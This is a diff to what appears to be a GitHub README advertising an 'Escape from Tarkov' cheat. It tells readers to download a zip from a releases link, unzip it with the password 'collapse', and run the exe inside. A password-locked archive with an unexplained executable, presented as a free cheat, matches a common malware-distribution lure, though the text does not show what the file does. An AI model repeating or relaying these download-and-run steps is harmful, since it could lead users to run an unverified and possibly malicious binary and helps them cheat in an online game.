@@ -1,7 +1,6 @@
-
-https://github.com/SimmmBo/EscapefromTarkov_CollapseCheat/releases/download/last/collapse_updated.zip
 ![1s](https://github.com/user-attachments/assets/d84f747b-658e-4012-ad85-77b0e07b22c9)
 >**download the archive**
+>https://github.com/SimmmBo/EscapefromTarkov_CollapseCheat/releases/download/last/collapse_updated.zip**
 >**unzip it (***Pass: collapse***)**
 >**run the exe file (if it doesn't work, write to the developer)**
 
